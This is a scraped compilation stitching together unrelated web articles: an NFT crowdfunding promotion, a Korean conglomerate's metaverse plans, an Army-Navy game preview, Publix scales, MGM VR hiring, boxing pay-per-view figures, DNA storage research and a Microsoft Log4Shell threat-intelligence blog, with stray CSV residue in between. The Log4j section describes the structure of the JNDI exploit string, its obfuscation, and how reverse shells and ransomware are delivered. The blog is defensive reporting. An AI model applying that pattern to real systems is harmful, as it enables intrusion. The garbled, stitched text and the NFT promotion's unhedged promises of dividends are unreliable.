Meta-fund.io is a French startup resulting from the experience and ambition of three IT specialists. The objective is simple: to create a bridge between project holders in the gaming tech and metaverse sectors on the one hand and investors in the cryptoassets sector on the other. In what format? A crowdfunding platform through NFT collections. Find out why and how this French company intends to shake up participatory investing.

[Discord link] [Twitter link] [Website link]

Presentation

Meta-fund.io wants to create a bridge between the financial contribution of project owners and the bonuses of crowdfunding for the buyers and holders of NFTs linked to these projects.

If we are all familiar with the system of crowdfunding platforms we can understand that it is generally a question of participation in the form of a donation in exchange for project-specific rewards or in exchange for a share in the project. Thus the platforms are becoming an alternative means of financing projects for product launches business development and structure creation.

Few companies are aware of the available funding space present in the cryptoasset sector and more specifically in NFTs. Many are afraid of it and rightly so due to the high price volatility of certain assets thus bringing a blur whenever the word crypto is uttered in a conversation.

Meta-fund.io builds an offer allowing companies engineers project holders to find financing by putting on sale a collection of NFTs representative of each project. The particularities of the latter depend on the needs in terms of funds. Thus the collection will be declined on a precise number of specimen with like all collections elements of rarity. These collections once in circulation will be available on the second market via NFT marketplaces like Solanart and Magic Eden are on the Solana network or Opensea on the Ethereum network.

After the sale meta-fund.io returns the funds in exchange for a share in the project thus providing two guarantees. The first is to provide project owners with support throughout the project’s implementation and development (legal marketing communication business etc.). The second guarantee is that the annual results of the project will be published publicly and that dividends will be paid out to the holders of the attached NFTs.

Vision of the markets

The global crowdfunding market was worth over $12 billion in 2020 with a forecast of over $25 billion by 2027 (source: Statista.com). On the other hand according to an analysis by JPMORGAN “The NFT market is now worth over $7 billion but legal issues facing this nascent sector could hamper its growth.

As the regulatory processes for cryptoasset markets increase investors are looking for solutions that are both secure and profitable. In this sense many large players are starting compliance processes to meet these requirements or find themselves in turmoil.

Meta-fund.io aims to provide full transparency both in the management of the funds used for each project but also on the payment of dividends and other benefits inherent to each project by requiring a KYC process for any holder wishing to take advantage of these bonuses.

The French startup wants to position itself as a springboard for gaming and tech talent while empowering investors.

What’s on the horizon for the startup?

“Gaming metaverse & tech” The promise is tantalising. Three departments will be developed during 2022 responsible for the development of a play-to-earn game and a metaverse running on an unreal engine. Other surprises await investors who wish to participate in the platform’s fundraising.

By March 2022 the platform will be online says Jonathan Edouard SLAMA one of the project’s co- founders. The first projects will follow including B.W.U. the play to earn game developed by the company.

Is it possible for us to invest in meta-fund.io?

The answer is yes!

The first project you can exchange your access key for is the ALPHA WORLD NFT Collector Cards. A unique collection of collector cards containing hidden items offering you special bonuses during the hunt for easter eggs: a giant geo cache allowing you to become one of the company’s managing shareholders alongside the main partners.

To invest or not to invest?

If you are interested in this project meta-fund.io is raising funds for their project through the sale of a first collection called “Access Keys Special NFTs” which will be available on the Solana platform.

These access keys are 6’000 and are exchangeable NFTs offering several advantages to their holders to thank them for participating in the development of their structure. Among these advantages you will find :

– Access to the platform’s NFT sales in preview

– The possibility to exchange them for an NFT of the same value from any future collection

The collection will go on sale on 19 December 2021 at 8pm. To participate you must join the company’s discord group where you will find all the information including how to participate in this auction or the next ones.

SK Square Co. the investment arm of the massive SK Group spun off into its own stock last month wants every portfolio company to have a metaverse presence Managing Director Huh Seok-joon 48 said in an interview. Their customers should be able to use cryptocurrencies for shopping streaming media and other transactions with the metaverse community he said.

Corporations the world over are laying bets on the metaverse an envisioned virtual environment where people can interact with the internet and others supplanting web browsers and mobile apps. SK Square is moving swiftly in a bid to avoid falling behind younger nimbler competitors: it bought a 35% stake in a crypto exchange last month and one of its affiliates is planning to issue a coin in the first half of next year Huh said.

“Our business needs to evolve into the metaverse” Huh said. “Our new interface between customers will be shifting from mobile phones to metaverse and coins will be used as new currencies on our platforms.”

SK Square is entering an already-crowded field that’s drawn the likes of Facebook-parent Meta Platforms Inc. and domestic rivals Naver Corp. and Kakao Corp. But these investments will likely take years to pay off if at all given the technology and software required to realize their vision of the metaverse remain nascent.

Such radical bets are rare among family-controlled conglomerates known as chaebol in South Korea which have been dependent on manufacturing sectors for decades. Seoul-based SK Square split off from SK Telecom Co. is following a SoftBank Group Corp. model for investments in future technologies.

On its first day of trading last week SK Square announced a 90 billion won ($76 million) investment in Korbit South Korea’s fourth-largest crypto exchange. Although Korbit’s share of the Korean market is only about 0.3% SK Square saw it as a good way to enter the crypto business at a cheap valuation. Dunamu parent of Korea’s leading crypto exchange firm Upbit has a valuation of about 17.8 trillion won according to Seoul Exchange an unlisted stock trading exchange platform.

SK Square aims to list coins on Korbit that can be used for buying products and services from SK Group companies starting with one coin and expanding from there Huh said. SK Square is the largest shareholder of chip giant SK Hynix Inc. and its other portfolio companies include app market firm One Store Co. online shopping mall 11street and ride-services provider Tmap Mobility. SK will eventually issue a coin for SK Telecom-operated metaverse platform called “ifland” Huh said.

SK Square’s investment comes as South Korea is tightening regulations on crypto activities and outlining laws related to investor protection and penalties on illegal acts. The country has shut down dozens of cryptocurrency exchanges and approved only a few major exchanges including Korbit that require users to register with real names and bank accounts for trading.

Yet SK Square is forging ahead. The company is mulling investments in foreign crypto exchange firms with a vision of establishing an international coin ecosystem Huh said. It would also consider buying cryptocurrencies including Bitcoin if local restrictions on direct investments in crypto assets are lifted he said.

“I don’t think cryptocurrency itself is a speculative asset” he said. “We are aware of the volatility of the price move and need to be careful. But it doesn’t make sense for us to rule out crypto as an investment option.”

The Game: 122nd Army-Navy Game

122nd Army-Navy Game The Venue: MetLife Stadium East Rutherford NJ

MetLife Stadium East Rutherford NJ The Series: Navy leads 61-53-7

Navy leads 61-53-7 The Time/TV: Saturday 3 p.m. ET CBS

It’s been a long long time since visitors to MetLife Stadium have been been able to be proud of their football teams. Fortunately two will be there to pick up the slack on Saturday afternoon.

The annual service academy showdown will be held at MetLife Stadium for the first time this afternoon pitting the Army Black Knights against the Navy Midshipmen. East Rutherford was chosen to stage the 122nd edition of the game in observance of 20 years since the tragic events of Sept. 11 2001.

The game is often held in Philadelphia due to its equal distance from both West Point and Annapolis though it was moved to Army’s Michie Stadium in 2020 due to the COVID-19 pandemic.

“I think New York City is looked upon as a symbol of strength for this nation. The towering buildings the financial district the fact that it’s the center of the world it’s right here it’s part of our country” Army head coach Jeff Monken said of the game’s return to the New York City area.

“That symbol of strength was attacked and for a moment just knocked to its knees but then the resiliency of New Yorkers but also the American people rose…Americans go and serve and fight for our freedom whether it’s on our own soil or somewhere else. To be able to honor those men and women that serve and answer that call is a tremendous privilege and an honor and we can do that with this game.”

“I think it’s a great honor for us to be able to play here” Navy head coach Ken Niumatololo concurred. “It’s a game (between) two institutions that represent our country two institutions that protect our country and our freedoms two institutions that had people who served and a paid the ultimate sacrifice because of the conflicts that occurred from 9/11. To be able to remember them to pay tribute to them. I think it’s only fitting that we are the two schools to do that.”

Army took home last year’s meeting on its home turf by a 15-0 final its first shutout in the rivalry since 1969. The Black Knights have won four of the past five meetings overall after ending Navy’s 14-game winning streak in 2016.

New York Jets participants of the Army-Navy game include active safety Elijah Riley who previously served as an Army defensive captain.

Army (8-3)

Records are often the last topic of conversation when discussing the Army-Navy Game but the Cadets carried on a period of football prosperity this season posting their fifth winning record over the past six seasons. One more game awaits them after Saturday as they’ll partake in the Armed Forces Bowl on Dec. 22 against Missouri.

Army has defined this season with a sense of physical smashmouth defensive football: the Black Knights defense ranks 16th nationally in yards allowed and each of their captains comes from the defense.

West Point reps are fully aware that their work will be cut out for them against Navy’s familiar offense.

“I think we’re playing our best football right now” junior defensive back Marquel Broughton said. “I think that we’ve had struggles throughout the season but we work together as a team everyone knows their job we do our job. Everyone plays their game really really well.”

Army’s offense long-defined by the triple option setup is further established through variety. A run game that ranked second in the nation saw five players earn at least 300 yards. Sophomore Tyrell Robinson has been a threat both through the air and on the ground (averaging 12.5 yards per touch) while junior Jakobi Buchanan has carried on in the tradition of power rushers Mike Mayweather and Darnell Woolfolk to score 11 touchdowns.

The Black Knights enter Saturday’s game as winners of its last four but they put up valiant efforts against elite foes earlier this season: a trip to Wisconsin was separated by only six points while a tilt against ACC finalists from Wake Forest ended in a 70-56 final. Monken believes that the tough schedule built character for his squad entering the crucial contest at MetLife.

“A schedule like that just forces you to play good players and good teams to evaluate and do things better and prepare and so I think in the long run it makes our guys better players. Hopefully that makes us a better team.”

No matter what happens on Saturday Army will maintain possession of the Commander-in-Chief’s Trophy for the fourth time in the past five seasons by virtue of their November win over Air Force (and Navy’s loss to the Falcons).

Navy (3-8 3-5 AAC)

Records are once again irrelevant as is when it comes to Army-Navy and that goes double for the Midshipmen’s losing mark. Even if not offset by the intensity of the game half of their losses came by one possession including a 27-20 loss at the hands of College Football Playoff participant Cincinnati in October.

Niumatololo set to partake in his 14th Army-Navy contest (an established Annapolis record) was nonetheless impressed with his team’s fight and resolve this season an impression that spread to his team’s leaders.

“I think we’ve gotten better. I think a big part of it is who we’ve played. We’ve had the number one toughest schedule in the country” Niumatololo said.

“We had our chances in a lot of those games but when you play those types of people you can’t make mistakes. When they’re better than you you have to play perfectly and we didn’t. But we’ve gotten better and have gotten our chances exactly right. I say our guys have improved. I’m encouraged because I feel like we’re playing our best football as we get to the end part of the season.”

“I feel like sometimes players have been trying to do too much” linebacker Diego Fagot added. “In an Army-Navy Game those mistakes are very amplified. For this game we’re definitely going to just try to focus on doing our jobs. I’m not going to try to do anyone else’s. I’m just going to try to do my specific job as a linebacker.”

Even with the fuel of winning this classic rivalry game proving reliable the Midshipmen enter in somewhat dire straits. they’re dead last in the AAC’s offensive rankings (a performance that led to a demotion for longtime offensive coordinator Ivin Jasper) and will be missing star defender Kevin Brennan out due to shoulder surgery.

That has done little to whittle Navy’s resolve as they’ll be looking to push the rivalry back to sea after dropping four of the last five. All but one of those losses have come by one possession.

Players to Watch

Army QB Christian Anderson

A quarterback playing a sizable role in the Army-Navy Game? Rest assured West Point it’s not Roger Staubach but it’s rather Anderson a Bronx native who’s looking to go out on a high note with a hint of revenge.

Anderson has made a surprising impact in Army’s aerial attack (averaging 12.4 yards on 44 attempts) and scored the Cadets’ only touchdown as a sophomore in the 31-7 loss to Navy in 2019.

Army DB Marquel Broughton

Among Army’s well-documented four defensive captains the Georgia-based Broughton is the only underclassman. Not only has he appeared at or near the top of collegiate analytic lists but he’s almost impressed Army management with the way he has risen to the occasion.

“Marquel was really special. He’s got a spirit about him. I think everybody on our team really is attracted to his spirit and his energy. He compels people to do their best and brings the best out of guys” Monken said of Broughton’s contributions. “A leader is a leader and Marquel has been a leader since the day you walk through the door.”

Navy WR Mychal Cooper

Saturday will be the last stand for Cooper one of the Midshipmen’s most consistent offensive weapons over the last four seasons. There’s no doubt he’d love to end his Annapolis career on a high note especially considering that Army has held him stat-less in each of the past two contests.

Navy LB Diego Fagot

If any of Saturday’s participants have an immediate NFL future it’s likely Fagot Navy’s leading backfield invader with 11 tackles for a loss. Following Saturday’s game Fagot will make an appearance in the East-West Shrine Bowl in Las Vegas next February.

Prediction: Army 16 Navy 7

Though temperatures are slightly warmer than a traditional Army-Navy Game the weather is still set to play an adversarial role through fog in the tri-state area. That should play well into the arm of an experienced well-tuned offense like Army’s.

It won’t be easy but the Black Knights should escape from New York (or head back to it) with another victory in hand.

Those big historic and industrial-looking scales at the front of Publix Super Markets could land on the scrapheap of supermarket history one day because the scale manufacturer stopped making them a Publix Facebook post recently reported.

At least one new store that recently joined the grocery chain’s Florida outlets opened without the scale. An associate said the new Publix located the Shoppes of Golf Village near Boynton Beach does not have one.

“The manufacturer ceased production in 2015 meaning that one day — although our wonderful repair shop keeps our remaining machines in great shape — the last Publix scale will retire” an Aug. 19 Facebook post announced.

RELATED: No scaling back: Tradition of Publix scales lasts decades and counting

The scales shaped like “lollipops” have been a Publix Super Market fixture for 81 years the post explained. When they made their first appearance initially at the back of the store and later by the front doors household scales were bulky and too expensive to own. Most people were weighed at the doctor’s office or Floridians went to Publix to check their weight. Over the years the current scales are now four times bigger and costlier than their original counterpart.

Ever the supermarket innovator George Jenkins saw the scarcity of weighing machines as an opportunity to bring in the customers.

On its blog The Publix Checkout a further history of the green scales was posted in 2016.

When Jenkins “founded Publix in 1930 he embarked on setting Publix apart from the competition by offering services and value to customers in things not seen around other grocery chains like his ‘food palace’ in 1940 equipped with air conditioning frozen food cases and many other innovations” wrote blogger Aijana W.

“However there’s one perk about shopping in Publix that’s been a part of the company since the beginning and still remains to this day: the weighing scales. The difference with Publix scales? It was completely free for our customers” the blogger wrote.

In a 1988 interview with Jenkins the company founder said the scales “were very popular. Even back then people were conscious of their weight.” He added more than 5 million customers weighed themselves in Publix’s during the first year of business.

And it’s not just Publix writers who have been pushing the lore of the 2831 People Weigher by Mettler Toledo which still manufactures other weighing systems for laboratories industry and food retail.

In a May 30 2018 report by the Tampa Bay Times the writer noted that these relics of a bygone era have been entertaining and enthralling Floridians and tourists for decades.

Some recalled childhood weights taken at Publix as milestones.

He added others liked to announce their light weigh publicly to anyone within earshot. And even visiting non-Floridians enjoyed the novelty on annual vacations. Others took to Twitter to question the accuracy of the scales after seeing their pounds display on the big round dial.

Spata wrote “In a 1988 feature in the Orlando Sentinel writer Donna Bouffard with the help of store employees in Winter Park identified seven recurring categories of scale users including ‘pickpockets’ who set aside keys change and wallets; ‘bashfuls’ who go to great lengths to make sure nobody is looking; ‘hoppers’ who leap on in a single bound; and ‘mechanics’ who insist this thing must be broken.

“They all ring true 30 years later employees say with the addition of a category: the “footloose” or those who remove their shoes and sometimes socks” Spata wrote.

All the fun and pleasant — or unpleasant — memories of the scales are not over yet.

The ritual of tipping the big green scale should remain a tradition for many Publix shoppers for some time throughout Florida. In the Publix seven-state operating area only Florida ever had the scales and as of September the Sunshine State has 828 Publix stores about two-thirds of its outlet across the Southeast.

Even if many of them become unrepairable the scale from the original Winter Haven store is donning the corporate headquarters in Lakeland in a historic display.

Publix representative Brian West told the Times “For the foreseeable future they will remain part of our Florida stores.”

Until they all disappear except for the original one Publix did stockpile enough parts to keep the old ones on life support as long as possible — so step on but step lightly.",,,,,,,,,,,,

MGM Resorts is letting applicants try a job in VR before they accept the role.

The casino and hotel company hopes it will reduce employee attrition.

MGM Resorts is rolling out headsets from VR-company Strivr at employment centers from January.

MGM Resorts is giving job applicants the chance to try out roles using virtual reality in the hope it will reduce employee attrition.

By using a VR headset the company — whose portfolio includes world-famous casinos such as the Bellagio and MGM Grand in Las Vegas — hopes that job seekers will be able to see whether the role is what they expected.

""It can be very difficult just to verbally explain the types of positions or show a video"" Laura Lee MGM Resorts' chief HR officer told Insider. With the VR experience applicants can ""throw a headset on and really experience the job"" she added.

Amid a nationwide labor shortage employers are having to work harder to attract and retain new hires. Many companies have recruited staff only to see them hand in their notice a short while later after the job didn't match their expectations. In the hospitality industry record numbers of workers have quit their jobs.

Lee said that the company is using the immersive technology to help reduce turnover. She said it would be rolling out the headsets for customer-service roles at its employment centers and potentially at career fairs from January as well as using them for training.

Lee said that in the past MGM Resorts had used day-in-the-life videos and chats with current employees to give applicants an insight into roles but nothing like this.

Some hospitality staff have complained that customers have gotten ruder during the pandemic. To prepare potential joiners for such scenarios Lee said MGM Resorts' VR module would include ""difficult guest interactions.""

Lee said she ""absolutely"" expected that some candidates after trying out a role using VR would decide it wasn't right for them.

Sometimes candidates accept jobs without realizing how difficult they may be she said. She added that had MGM Resorts used the technology at recent casino openings it ""might've resolved some turnover we experienced when people accepted positions and then realized it wasn't quite what they thought it would be.""

Lee said the VR would be especially useful with MGM Resorts' upcoming expansion into Japan. The country currently doesn't have any casinos – MGM Resorts' $9 billion casino in Osaka is due to be the first — meaning potential employees may be unfamiliar with what those types of jobs entail.

The VR would be optional for job seekers to try out Lee added and wouldn't be used for office-based roles. The company would use the technology for front-of-house roles like operating casino games and checking guests into hotels.

MGM Resorts developed the package with VR-firm Strivr which also works with Walmart Bank of America Verizon and FedEx.







As well as providing job previews and training some companies are using Strivr to assess workers' abilities. Walmart for example used Strivr VR headsets to see whether employees should be promoted to middle-management positions.

Strivr CEO Derek Belch said the data gathered from using VR ""can be very powerful for both the employee as part of their candidacy for a role as well as for the employer to make better data-driven decisions.""

MGM's staffing levels are recovering

MGM Resorts said in its 2020 annual report that it had frozen hiring furloughed staff cancelled merit pay increases and undertaken ""headcount reductions"" to minimize cash outflows during the first wave of COVID-19 lockdowns.

Lee said that MGM Resorts was experiencing understaffing in some areas but that the majority of employees it had laid off during the pandemic had returned. At its third-quarter earnings call the company's CFO said labor availability had been improving each month.",https://news.google.com/articles/CBMid2h0dHBzOi8vd3d3LmVzc2VudGlhbGx5c3BvcnRzLmNvbS9ib3hpbmctbmV3cy1jYW5lbG8tYWx2YXJlei12cy1jYWxlYi1wbGFudC1kcmF3cy1vdmVyLTgwMDAwMC1wcHYtYnV5cy1pbi10aGUtdXMtYWxvbmUv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Canelo Alvarez vs. Caleb Plant Draws Over 800000 PPV Buys in the US Alone,"Nov 6 2021; Las Vegas Nevada USA; Canelo Alvarez (gold/white trunks) and Caleb Plant (white/gray trunks) box during their undisputed super middleweight world championship boxing match at MGM Grand Garden Arena.

Canelo Alvarez has left no doubts regarding his in-ring supremacy especially after beating Caleb Plant to become boxing’s first-ever undisputed super middleweight champion. ‘The Mexican also strengthened his aura as he received more support in the USA than American boxer Caleb Plant. As ‘Sweethands’ also had his followers it turned the night even spectacular.

This card competed with the UFC 268 card. Canelo Alvarez’s show is always an attention seeker and it predictably did very well at the Box Office. Even Dana White was caught watching Plant vs Alvarez while Rose Namajunas was battling Zhang Weili in the octagon.

Per reports it “projects to generate” 800000 domestic PPV buys in the USA. The global PPV buys are expected to be even more. As the PPV price was set at $79.99 it assured a hefty income for Showtime Sports the official broadcaster.

No viable source reflects the PPV buys of UFC 268. On that note the Plant vs Alvarez showdown appears to have had massive success in the stellar fight week.

While Caleb Plant failed to make an impact inside the ring it was still a beneficial night for ‘Sweethands’. Having boxed the P4P king he learned a lot about the loopholes in his game. Besides Plant also bagged the biggest pay-check of his career.

According to reports Canelo Alvarez amassed $40 million from the fight whereas Plant made $10 million. So the recent fight has clearly raked both men’s net worth to a great extent.

Canelo Alvarez is the new cash cow of boxing

Every time Saul ‘Canelo’ Alvarez enters the ring he steals most of the spotlight. While UFC 268 happened on the same date and Mikaela Mayer won the IBO 130 lbs belt just a day prior most of the combat fans were interested in Canelo Alvarez vs Caleb Plant.

The technology once mastered would yield millions of times greater efficiency but impediments in reliability and read/write speeds have stymied the arrival of a true paradigm shift in archival storage. Now a team led by researchers from the Georgia Tech Research Institute (GTRI) has advanced DNA storage with a microchip that can quickly and cheaply grow DNA strands for high-density storage.

The microchips – which currently exist as proofs of concept – are about one square inch and include ten banks of “wells” each a few hundred nanometers deep that house the DNA strands as they grow. “Working with our colleagues at Twist and in Georgia Tech’s Institute for Electronics and Nanotechnology we have optimized the geometry of the microwells to fit more and more of them on a chip” explained Nicholas Guise a senior research scientist at GTRI and project director for the Scalable Molecular Archival Software and Hardware (SMASH) project in an interview with GTRI’s John Toon.

The final version of the microchips the researchers say will include a second layer of electronics to manage the chemical process. After the strands are completed they will be harvested and dried.

“We’ve been able to show that it’s possible to grow DNA to the sort of length that we want and at about the feature size that we care about using these chips” Guise said. “The goal is to grow millions of unique independent sequences across the chip from these microwells with each serving as a tiny electrochemical bioreactor.”

To compensate for DNA storage’s high error rate the researchers also designed a codec to identify and correct errors. “We’ve targeted this codec to be super robust against errors able to work with devices that read as much as 10% of the bases wrong” said Adam Meier a senior scientist with GTRI and SMASH. “What we expect is that eventually the error correction code will be more lightweight. It will eventually have less of an impact on the final design and when the error rates are better then the codec will become less important. That’s part of our research into future phases of the program.”

“What this does operationally is allow us to potentially turn up the speed and throughput of the synthesizer and sequencer” Guise added. “If you can tolerate some of the error through a resilient codec you can write much more data and read much more data faster.”

This open-source component is widely used across many suppliers’ software and services. By nature of Log4j being a component the vulnerabilities affect not only applications that use vulnerable libraries but also any services that use these applications so customers may not readily know how widespread the issue is in their environment. Customers are encouraged to utilize scripts and scanning tools to assess their risk and impact. Microsoft has observed attackers using many of the same inventory techniques to locate targets. Sophisticated adversaries (like nation-state actors) and commodity attackers alike have been observed taking advantage of these vulnerabilities. There is high potential for the expanded use of the vulnerabilities. In January we started seeing attackers taking advantage of the vulnerabilities in internet-facing systems eventually deploying ransomware. We have observed many existing attackers adding exploits of these vulnerabilities in their existing malware kits and tactics from coin miners to hands-on-keyboard attacks. Organizations may not realize their environments may already be compromised. Microsoft recommends customers to do additional review of devices where vulnerable installations are discovered. At this juncture customers should assume broad availability of exploit code and scanning capabilities to be a real and present danger to their environments. Due to the many software and services that are impacted and given the pace of updates this is expected to have a long tail for remediation requiring ongoing sustainable vigilance. January 19 2022 update – We added new information about an unrelated vulnerability we discovered while investigating Log4j attacks. January 21 2022 update – Threat and vulnerability management can now discover vulnerable Log4j libraries including Log4j files and other files containing Log4j packaged into Uber-JAR files.

The remote code execution (RCE) vulnerabilities in Apache Log4j 2 referred to as “Log4Shell” (CVE-2021-44228 CVE-2021-45046 CVE-2021-44832) has presented a new attack vector and gained broad attention due to its severity and potential for widespread exploitation. The majority of attacks we have observed so far have been mainly mass-scanning coin mining establishing remote shells and red-team activity but it’s highly likely that attackers will continue adding exploits for these vulnerabilities to their toolkits.

With nation-state actors testing and implementing the exploit and known ransomware-associated access brokers using it we highly recommend applying security patches and updating affected products and services as soon as possible. Refer to the Microsoft Security Response Center blog for technical information about the vulnerabilities and mitigation recommendations.

Meanwhile defenders need to be diligent in detecting hunting for and investigating related threats. This blog reports our observations and analysis of attacks that take advantage of the Log4j 2 vulnerabilities. It also provides our recommendations for using Microsoft security solutions to (1) find and remediate vulnerable services and systems and (2) detect investigate and respond to attacks.

This blog covers the following topics:

Attack vectors and observed activity

Microsoft’s unified threat intelligence team comprising the Microsoft Threat Intelligence Center (MSTIC) Microsoft 365 Defender Threat Intelligence Team RiskIQ and the Microsoft Detection and Response Team (DART) among others have been tracking threats taking advantage of the remote code execution (RCE) vulnerabilities in Apache Log4j 2 referred to as “Log4Shell”.

The bulk of attacks that Microsoft has observed at this time have been related to mass scanning by attackers attempting to thumbprint vulnerable systems as well as scanning by security companies and researchers. An example pattern of attack would appear in a web request log with strings like the following:

An attacker performs an HTTP request against a target system which generates a log using Log4j 2 that leverages JNDI to perform a request to the attacker-controlled site. The vulnerability then causes the exploited process to reach out to the site and execute the payload. In many observed attacks the attacker-owned parameter is a DNS logging system intended to log a request to the site to fingerprint the vulnerable systems.

The specially crafted string that enables exploitation of the vulnerabilities can be identified through several components. The string contains “jndi” which refers to the Java Naming and Directory Interface. Following this the protocol such as “ldap” “ldaps” “rmi” “dns” “iiop” or “http” precedes the attacker domain.

As security teams work to detect the exploitation attackers have added obfuscation to these requests to evade detections based on request patterns. We’ve seen things like running a lower or upper command within the exploitation string and even more complicated obfuscation attempts such as the following that are all trying to bypass string-matching detections:

The vast majority of observed activity has been scanning but exploitation and post-exploitation activities have also been observed. Based on the nature of the vulnerabilities once the attacker has full access and control of an application they can perform a myriad of objectives. Microsoft has observed activities including installing coin miners using Cobalt Strike to enable credential theft and lateral movement and exfiltrating data from compromised systems.

Exploitation continues on non-Microsoft hosted Minecraft servers

Minecraft customers running their own servers are encouraged to deploy the latest Minecraft server update as soon as possible to protect their users. More information can be found here: https://aka.ms/mclog.

Microsoft can confirm public reports of the Khonsari ransomware family being delivered as payload post-exploitation as discussed by Bitdefender. In Microsoft Defender Antivirus data we have observed a small number of cases of this being launched from compromised Minecraft clients connected to modified Minecraft servers running a vulnerable version of Log4j 2 via the use of a third-party Minecraft mods loader.

In these cases an adversary sends a malicious in-game message to a vulnerable Minecraft server which exploits CVE-2021-44228 to retrieve and execute an attacker-hosted payload on both the server and on connected vulnerable clients. We observed exploitation leading to a malicious Java class file that is the Khonsari ransomware which is then executed in the context of javaw.exe to ransom the device.

While it’s uncommon for Minecraft to be installed in enterprise networks we have also observed PowerShell-based reverse shells being dropped to Minecraft client systems via the same malicious message technique giving an actor full access to a compromised system which they then use to run Mimikatz to steal credentials. These techniques are typically associated with enterprise compromises with the intent of lateral movement. Microsoft has not observed any follow-on activity from this campaign at this time indicating that the attacker may be gathering access for later use.

Due to the shifts in the threat landscape Microsoft reiterates the guidance for Minecraft customers running their own servers to deploy the latest Minecraft server update and for players to exercise caution by only connecting to trusted Minecraft servers.

Nation-state activity

April 2023 update – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. To learn more about this evolution how the new taxonomy represents the origin unique traits and impact of threat actors and a complete mapping of threat actor names read this blog: Microsoft shifts to a new threat actor naming taxonomy.

MSTIC has also observed the CVE-2021-44228 vulnerability being used by multiple tracked nation-state activity groups originating from China Iran North Korea and Turkey. This activity ranges from experimentation during development integration of the vulnerabilities to in-the-wild payload deployment and exploitation against targets to achieve the actor’s objectives.

For example MSTIC has observed PHOSPHORUS an Iranian actor known to deploy ransomware acquiring and making modifications of the Log4j exploit. We assess that PHOSPHORUS has operationalized these modifications.

In addition HAFNIUM a threat actor group operating out of China has been observed utilizing the vulnerability to attack virtualization infrastructure to extend their typical targeting. In these attacks HAFNIUM-associated systems were observed using a DNS service typically associated with testing activity to fingerprint systems.

Access brokers associated with ransomware

MSTIC and the Microsoft 365 Defender team have confirmed that multiple tracked activity groups acting as access brokers have begun using the vulnerability to gain initial access to target networks. These access brokers then sell access to these networks to ransomware-as-a-service affiliates. We have observed these groups attempting exploitation on both Linux and Windows systems which may lead to an increase in human-operated ransomware impact on both of these operating system platforms.

Mass scanning activity continues

The vast majority of traffic observed by Microsoft remains mass scanners by both attackers and security researchers. Microsoft has observed rapid uptake of the vulnerability into existing botnets like Mirai existing campaigns previously targeting vulnerable Elasticsearch systems to deploy cryptocurrency miners and activity deploying the Tsunami backdoor to Linux systems. Many of these campaigns are running concurrent scanning and exploitation activities for both Windows and Linux systems using Base64 commands included in the JDNI:ldap:// request to launch bash commands on Linux and PowerShell on Windows.

Microsoft has also continued to observe malicious activity performing data leakage via the vulnerability without dropping a payload. This attack scenario could be especially impactful against network devices that have SSL termination where the actor could leak secrets and data.

Additional RAT payloads

We’ve observed the dropping of additional remote access toolkits and reverse shells via exploitation of CVE-2021-44228 which actors then use for hands-on-keyboard attacks. In addition to the Cobalt Strike and PowerShell reverse shells seen in earlier reports we’ve also seen Meterpreter Bladabindi and HabitsRAT. Follow-on activities from these shells have not been observed at this time but these tools have the ability to steal passwords and move laterally.

This activity is split between a percentage of small-scale campaigns that may be more targeted or related to testing and the addition of CVE-2021-44428 to existing campaigns that were exploiting vulnerabilities to drop remote access tools. In the HabitsRAT case the campaign was seen overlapping with infrastructure used in prior campaigns.

Webtoos

The Webtoos malware has DDoS capabilities and persistence mechanisms that could allow an attacker to perform additional activities. As reported by RiskIQ Microsoft has seen Webtoos being deployed via the vulnerability. Attackers’ use of this malware or intent is not known at this time but the campaign and infrastructure have been in use and have been targeting both Linux and Windows systems prior to this vulnerability.

A note on testing services and assumed benign activity

While services such as interact.sh canarytokens.org burpsuite and dnslog.cn may be used by IT organizations to profile their own threat footprints Microsoft encourages including these services in your hunting queries and validating observations of these in environments to ensure they are intentional and legitimate activity.

Exploitation in internet-facing systems leads to ransomware

As early as January 4 attackers started exploiting the CVE-2021-44228 vulnerability in internet-facing systems running VMware Horizon. Our investigation shows that successful intrusions in these campaigns led to the deployment of the NightSky ransomware.

These attacks are performed by a China-based ransomware operator that we’re tracking as DEV-0401. DEV-0401 has previously deployed multiple ransomware families including LockFile AtomSilo and Rook and has similarly exploited Internet-facing systems running Confluence (CVE-2021-26084) and on-premises Exchange servers (CVE-2021-34473).

Based on our analysis the attackers are using command and control (CnC) servers that spoof legitimate domains.

During our sustained monitoring of threats taking advantage of the Log4j 2 vulnerabilities we observed activity related to attacks being propagated via a previously undisclosed vulnerability in the SolarWinds Serv-U software. We discovered that the vulnerability now tracked as CVE-2021-35247 is an input validation vulnerability that could allow attackers to build a query given some input and send that query over the network without sanitation.

We reported our discovery to SolarWinds and we’d like to thank their teams for immediately investigating and working to remediate the vulnerability. We strongly recommend affected customers to apply security updates released by referring to the SolarWinds advisory here: https://www.solarwinds.com/trust-center/security-advisories/cve-2021-35247.

Microsoft customers can use threat and vulnerability management in Microsoft Defender for Endpoint to identify and remediate devices that have this vulnerability. In addition Microsoft Defender Antivirus and Microsoft Defender for Endpoint detect malicious behavior related to the observed activity.

Finding and remediating vulnerable apps and systems

Threat and vulnerability management

Threat and vulnerability management capabilities in Microsoft Defender for Endpoint monitor an organization’s overall security posture and equip customers with real-time insights into organizational risk through continuous vulnerability discovery intelligent prioritization and the ability to seamlessly remediate vulnerabilities.

Discovering affected components software and devices via a unified Log4j dashboard

Threat and vulnerability management automatically and seamlessly identifies devices affected by the Log4j vulnerabilities and the associated risk in the environment and significantly reduces time-to-mitigate. Microsoft continues to iterate on these features based on the latest information from the threat landscape. This section will be updated as those new features become available for customers.

The wide use of Log4j across many supplier’s products challenge defender teams to mitigate and address the risks posed by the vulnerabilities (CVE-2021-44228 or CVE-2021-45046). The threat and vulnerability management capabilities within Microsoft 365 Defender can help identify vulnerable installations. On December 15 we began rolling out updates to provide a consolidated view of the organizational exposure to the Log4j 2 vulnerabilities—on the device software and vulnerable component level—through a range of automated complementing capabilities. These capabilities are supported on Windows 10 Windows 11 and Windows Server 2008 2012 and 2016. They are also supported on Linux but they require updating the Microsoft Defender for Endpoint Linux client to version 101.52.57 (30.121092.15257.0) or later. The updates include the following:

Discovery of vulnerable Log4j library components (paths) on devices

Discovery of vulnerable installed applications that contain the Log4j library on devices

A dedicated Log4j dashboard that provides a consolidated view of various findings across vulnerable devices vulnerable software and vulnerable files

Introduction of a new schema in advanced hunting DeviceTvmSoftwareEvidenceBeta which surfaces file-level findings from the disk and provides the ability to correlate them with additional context in advanced hunting:

